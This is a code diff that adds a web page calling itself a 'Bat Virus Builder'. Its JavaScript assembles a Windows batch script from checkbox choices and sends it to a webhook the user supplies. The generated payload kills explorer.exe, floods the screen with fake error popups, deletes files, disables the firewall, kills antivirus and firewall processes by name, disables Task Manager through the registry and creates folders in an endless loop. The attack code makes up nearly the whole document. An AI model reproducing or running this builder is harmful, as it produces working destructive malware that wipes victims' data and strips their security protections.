@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Script Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 400px;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        label, input, button, textarea {
+            display: block;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+        label {
+            font-weight: bold;
+            color: #555;
+        }
+        input[type="text"], textarea {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        input[type="checkbox"] {
+            display: inline-block;
+            width: auto;
+            margin-right: 10px;
+        }
+        button {
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        textarea {
+            height: 150px;
+            resize: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Script Generator</h1>
+
+        <label for="webhookUrl">Webhook URL:</label>
+        <input type="text" id="webhookUrl" placeholder="Enter Webhook URL">
+
+        <label><input type="checkbox" id="explorerKill"> Kill Explorer</label>
+        <label><input type="checkbox" id="infiniteError"> Infinite Error Message</label>
+        <label><input type="checkbox" id="deleteFiles"> Delete All Files</label>
+        <label><input type="checkbox" id="disableFirewall"> Disable Firewall</label>
+        <label><input type="checkbox" id="disableTaskManager"> Disable Task Manager</label>
+        <label><input type="checkbox" id="infiniteFolderCreate"> Infinite Folder Create</label>
+        <label><input type="checkbox" id="loopAll"> Loop All</label>
+
+        <button onclick="generateAndSend()">Generate and Send</button>
+
+        <textarea id="output" readonly></textarea>
+    </div>
+
+    <script>
+        function createScript(explorerKill, infiniteError, deleteAllFiles, disableFirewall, disableTaskManager, infiniteFolderCreate, loopAll, errorMessage) {
+            let lines = [];
+            
+            // Made with Bat Virus Builder line
+            lines.push("echo Made with Bat Virus Builder\n");
+
+            // @echo off command
+            lines.push("@echo off\n");
+
+            // Explorer Kill command
+            if (explorerKill) {
+                lines.push("taskkill /f /im explorer.exe\n");
+            }
+
+            // Infinite Error command
+            if (infiniteError) {
+                lines.push(
+                    `echo.X=MsgBox("${errorMessage}",0+16,"Windows ") >> FakeErrorMsg.vbs\n` +
+                    `echo.X=MsgBox("${errorMessage}",1+10,"Windows") >> FakeErrorMsg1.vbs\n` +
+                    `echo.X=MsgBox("${errorMessage}",2+32,"Windows") >> FakeErrorMsg2.vbs\n` +
+                    `echo.X=MsgBox("${errorMessage}",3+48,"Windows") >> FakeErrorMsg3.vbs\n` +
+                    'start FakeErrorMsg.vbs >nul 2>&1\n' +
+                    'start FakeErrorMsg1.vbs >nul 2>&1\n' +
+                    'start FakeErrorMsg2.vbs >nul 2>&1\n' +
+                    'start FakeErrorMsg3.vbs >nul 2>&1\n'
+                );
+            }
+
+            // Delete All Files command
+            if (deleteAllFiles) {
+                lines.push("del *.*\n");
+            }
+
+            // Disable Firewall command
+            if (disableFirewall) {
+                lines.push(
+                    'netsh firewall set opmode mode=disable\n' +
+                    'tskill /A av*\n' +
+                    'tskill /A fire*\n' +
+                    'tskill /A anti*\n' +
+                    'cls\n' +
+                    'tskill /A spy*\n' +
+                    'tskill /A bullguard\n'
+                );
+            }
+
+            // Disable Task Manager command
+            if (disableTaskManager) {
+                lines.push('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n');
+            }
+
+            // Infinite Folder Create command
+            if (infiniteFolderCreate) {
+                if (loopAll) {
+                    lines.push(':folderLoop\nmd %random%\ngoto folderLoop\n');
+                } else {
+                    for (let i = 0; i < 15; i++) {
+                        lines.push('md %random%\n');
+                    }
+                }
+            }
+
+            // Loop All command
+            if (loopAll) {
+                lines = ["@echo off\n:loop\n"].concat(lines).concat(["goto loop\n"]);
+            }
+
+            return lines.join('');
+        }
+
+        function generateAndSend() {
+            const webhookUrl = document.getElementById('webhookUrl').value;
+            const explorerKill = document.getElementById('explorerKill').checked;
+            const infiniteError = document.getElementById('infiniteError').checked;
+            const deleteFiles = document.getElementById('deleteFiles').checked;
+            const disableFirewall = document.getElementById('disableFirewall').checked;
+            const disableTaskManager = document.getElementById('disableTaskManager').checked;
+            const infiniteFolderCreate = document.getElementById('infiniteFolderCreate').checked;
+            const loopAll = document.getElementById('loopAll').checked;
+
+            let errorMessage = "Cihazınız Tehlikede!";
+            if (infiniteError) {
+                errorMessage = prompt("What is the error message?", errorMessage);
+                if (!errorMessage) {
+                    alert("Lütfen bir hata mesajı girin!");
+                    return;
+                }
+            }
+
+            if (!webhookUrl) {
+                alert("Lütfen webhook URL'sini girin!");
+                return;
+            }
+
+            const scriptContent = createScript(explorerKill, infiniteError, deleteFiles, disableFirewall, disableTaskManager, infiniteFolderCreate, loopAll, errorMessage);
+            document.getElementById('output').value = scriptContent;
+            
+            sendToWebhook(webhookUrl, scriptContent);
+        }
+
+        function sendToWebhook(url, content) {
+            const data = {
+                content: `\`\`\`\n${content}\n\`\`\``
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.status === 204) {
+                    alert("Script başarıyla gönderildi!");
+                } else {
+                    alert("Script gönderilemedi! Lütfen webhook URL'sini kontrol edin.");
+                }
+            })
+            .catch(error => {
+                console.error("Error sending webhook:", error);
+                alert("Script gönderilemedi! Lütfen webhook URL'sini kontrol edin.");
+            });
+        }
+    </script>
+</body>
+</html>
